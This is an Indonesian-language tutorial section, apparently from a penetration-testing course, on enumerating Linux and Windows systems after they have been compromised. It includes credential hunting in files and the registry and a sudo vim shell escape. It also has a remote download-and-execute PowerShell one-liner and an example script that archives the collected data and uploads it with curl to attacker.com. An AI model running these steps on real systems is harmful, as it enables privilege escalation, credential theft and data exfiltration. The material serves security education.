# 3.1 System Enumeration

System enumeration adalah proses mengumpulkan informasi detail tentang sistem yang telah berhasil dikompromikan. Ini adalah langkah krusial untuk memahami environment, menemukan jalur privilege escalation, dan mengidentifikasi data berharga.

## Mengapa System Enumeration Penting?

1. **Privilege Escalation** - Menemukan konfigurasi yang rentan untuk naik ke level yang lebih tinggi
2. **Lateral Movement** - Mengidentifikasi sistem lain yang dapat diakses
3. **Data Location** - Menemukan lokasi file dan data berharga
4. **Persistence Options** - Memahami cara terbaik untuk mempertahankan akses
5. **Network Mapping** - Memahami topologi jaringan internal

## Linux System Enumeration

### Basic System Information

```bash
# Informasi dasar sistem
whoami
# Output: apache (user yang sedang login)

id
# Output: uid=33(apache) gid=33(apache) groups=33(apache)
# Menunjukkan user ID dan group ID

uname -a
# Output: Linux target 4.15.0-151-generic #157-Ubuntu SMP Thu Jul 23 14:39:03 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
# Menunjukkan kernel version 4.15.0 - vulnerable untuk beberapa exploits

hostname
# Output: web-server-01
# Memberi informasi tentang naming convention di environment

cat /etc/issue
# Output: Ubuntu 18.04.4 LTS \n \l
# Menunjukkan OS version (Ubuntu 18.04 - EOL, ada banyak exploits)
```

### Network Configuration

```bash
# Interface configuration
ifconfig -a
# Atau modern alternative:
ip addr show
# Output menunjukkan semua interface, IP addresses, dan interface status

# Routing table
ip route
# Output menunjukkan default gateway dan network routes

# ARP table
arp -a
# Menunjukkan MAC addresses dari host yang pernah dikomunikasikan

# Network connections
netstat -antup
# Atau lebih modern:
ss -tulpn
# Menunjukkan:
# - Semua listening ports
# - Process yang menggunakan ports
# - Established connections

# Contoh output yang menarik:
# tcp  0   0 127.0.0.1:3306    0.0.0.0:*   LISTEN  758/mysqld
# MySQL berjalan di localhost
```

### User Information

```bash
# Semua user di sistem
cat /etc/passwd | cut -d: -f1
# Output list semua users

# User dengan shell access
grep 'sh$' /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# user1:x:1000:1000:user1:/home/user1:/bin/bash
# Fokus pada user dengan /bin/bash

# Cek sudo access
sudo -l
# Jika password tidak diperlukan:
# (ALL) NOPASSWD: ALL
# Berarti bisa menjalankan command apa pun sebagai root tanpa password

# Sudo configuration
cat /etc/sudoers
# Cek konfigurasi spesifik seperti:
# user1 ALL=(ALL) /bin/vim /etc/hosts
# Bisa dieksploitasi untuk privilege escalation
```

### Process Enumeration

```bash
# Semua running processes
ps aux
# Atau dengan tree view:
ps -ef --forest

# Proses yang menarik untuk diperiksa:
# - Proses yang running sebagai root
# - Proses yang memiliki file descriptor terbuka
# - Proses dengan environment variables

# Contoh mencari proses yang running sebagai root:
ps aux | grep "^root"

# Check process environment
cat /proc/[PID]/environ
# Bisa mengandung passwords atau API keys
```

### File System Enumeration

```bash
# SUID binaries (bisa dieksploitasi untuk privilege escalation)
find / -perm -4000 -type f 2>/dev/null
# Output yang menarik:
# /usr/bin/passwd
# /usr/bin/sudo
# /usr/bin/chsh
# /usr/bin/vim.tiny
# /usr/bin/find

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Files yang bisa ditulis oleh current user
find / -writable -type f 2>/dev/null | grep -v "^/proc"

# Temporary files
ls -la /tmp/
ls -la /var/tmp/
# Banyak attacker meninggalkan tools di sini

# Search untuk passwords di files
grep -R "password=" / 2>/dev/null | grep -v "Binary file"
grep -i "password" /var/log/*.log 2>/dev/null

# Backup files
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
```

## Windows System Enumeration

### Basic System Information

```powershell
# System details
systeminfo
# Output:
# OS Name:                   Microsoft Windows 10 Enterprise
# OS Version:                10.0.17763 N/A Build 17763
# System Type:               x64-based PC
# Hotfixes installed:        Daftar semua Windows updates

# Current user context
whoami
# Output: target\user1

# User privileges
whoami /priv
# Menunjukkan semua privileges yang dimiliki user
# Look for:
# SeDebugPrivilege
# SeBackupPrivilege
# SeRestorePrivilege

# User groups
whoami /groups
# Menunjukkan semua group memberships
# Cek jika user di group:
# - Administrators
# - Remote Desktop Users
# - Backup Operators
```

### Network Configuration

```cmd
# IP configuration
ipconfig /all
# Look for:
# - DNS servers (internal domain names)
# - DHCP server info
# - Default gateway
# - Additional interfaces

# Network connections
netstat -anob
# Menunjukkan:
# - Semua listening ports
# - Established connections
# - Process ID yang menggunakannya
# - Executable path

# Alternative PowerShell:
Get-NetTCPConnection | Select LocalAddress,LocalPort,State,OwningProcess

# ARP table
arp -a
# Shows network neighbors

# Route table
route print
# Shows network routes
```

### User Information

```cmd
# All local users
net user
# Atau lebih detail:
net user /domain  # Jika di domain

# Specific user details
net user administrator
# Shows:
# - Account active
# - Password last set
# - Logon times
# - Group memberships

# Local groups
net localgroup
net localgroup Administrators

# Currently logged users
query user
# Shows:
# - Username
# - Session name
# - ID
# - State
# - Idle time
# - Logon time
```

### Service Enumeration

```cmd
# All services
sc query

# Running services only
sc query state= running

# Service configuration
sc query "ServiceName"
sc qc "ServiceName"

# Look for:
# - Services with unquoted paths
# - Services with weak permissions
# - Services that auto-start

# Example output yang vulnerable:
# BINARY_PATH_NAME   : C:\Program Files\Vuln App\app.exe
# (Space di path tanpa quotes)
```

### Application Enumeration

```cmd
# Installed programs
wmic product get name,version

# Or PowerShell:
Get-WmiObject -Class Win32_Product | Select Name,Version

# Look for:
# - Old vulnerable software
# - Development tools
# - Admin tools

# Auto-start programs
wmic startup get caption,command
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Scheduled tasks
schtasks /query /fo LIST
# Look for tasks that run as privileged users
```

### Registry Enumeration

```cmd
# SAM database location
reg query HKLM\SAM

# Search for passwords in registry
reg query HKCU /v "password" /s
reg query HKLM /v "password" /s

# Check for saved credentials
cmdkey /list

# Software configuration
reg query HKLM\SOFTWARE
```

## Automation Tools

### LinEnum (Linux Enumeration Script)

```bash
# Download dan run
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Output yang dihasilkan:
# - Kernel version and potential exploits
# - All SUID/SGID files
# - Writable files and folders
# - Scheduled cron jobs
# - Network information
# - Running processes
```

### WinPEAS (Windows Privilege Escalation Awesome Script)

```powershell
# Download dan run
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEAS.bat')"

# Categories yang diperiksa:
# - System information
# - User information
# - Processes
# - Services
# - Network
# - Windows Defender & AppLocker
# - Scheduled tasks
# - AlwaysInstallElevated
# - Cached credentials
```

### PowerUp (PowerShell Privilege Escalation)

```powershell
# Import module
Import-Module .\PowerUp.ps1

# Run all checks
Invoke-AllChecks

# Specific checks
Find-PathDLLHijack
Get-ServiceUnquoted
Get-ServicePermission
```

## Important Discovery Patterns

### Linux Pattern Recognition

```bash
# Check untuk sudo misconfiguration
sudo -l
# Jika output:
# (root) NOPASSWD: /usr/bin/vim
# Bisa jalankan: sudo vim -c ':!/bin/sh'

# Check untuk writable directories
find / -type d -writable 2>/dev/null | grep -v "/proc"

# Check untuk world-writable files
find / -type f -perm -002 2>/dev/null

# Check untuk kernel vulnerabilities
uname -a
# Lalu search:
searchsploit linux kernel 4.15
searchsploit ubuntu 18.04 priv esc
```

### Windows Pattern Recognition

```powershell
# Check untuk AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Check untuk stored credentials
cmdkey /list

# Check untuk sensitive files
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

## Documentation Tips

1. **Save Everything**: Simpan semua output ke file
   ```bash
   # Linux
   whoami > ~/enum/whoami.txt
   id > ~/enum/id.txt
   uname -a > ~/enum/uname.txt

   # Windows
   systeminfo > C:\temp\systeminfo.txt
   whoami /groups > C:\temp\groups.txt
   ```

2. **Create Enumeration Script**:
   ```bash
   #!/bin/bash
   mkdir -p /tmp/enum
   echo "=== WHOAMI ===" > /tmp/enum/whoami.txt
   whoami >> /tmp/enum/whoami.txt
   echo "=== ID ===" > /tmp/enum/id.txt
   id >> /tmp/enum/id.txt
   # ... add more commands
   tar czf /tmp/enumeration.tgz /tmp/enum/
   curl -F "file=@/tmp/enumeration.tgz" http://attacker.com/upload.php
   ```

3. **Take Screenshots**: Untuk GUI access
   - System properties
   - User management
   - Service configuration
   - Network configuration

## Common Pitfalls

1. **Missing Virtualization**: Check if in VM or container
   ```bash
   # Check untuk Docker
   ls -la /.dockerenv

   # Check untuk virtualization
   dmesg | grep -i virtual
   ```

2. **Missing Limited Shells**: Check for restricted shells
   ```bash
   echo $SHELL
   env | grep SHELL
   ```

3. **Missing AppArmor/SELinux**: Check security modules
   ```bash
   # AppArmor
   aa-status

   # SELinux
   sestatus
   getenforce
   ```

## Next Steps After Enumeration

Setelah melakukan system enumeration:

1. **Analyze findings** untuk privilege escalation paths
2. **Document** semua informasi relevan
3. **Search for exploits** berdasarkan software versions
4. **Test misconfigurations** yang ditemukan
5. **Prepare for lateral movement** jika ada access ke network lain

System enumeration adalah fondasi untuk post-exploitation activities. Informasi yang dikumpulkan akan membantu dalam memilih techniques yang tepat untuk environment tersebut.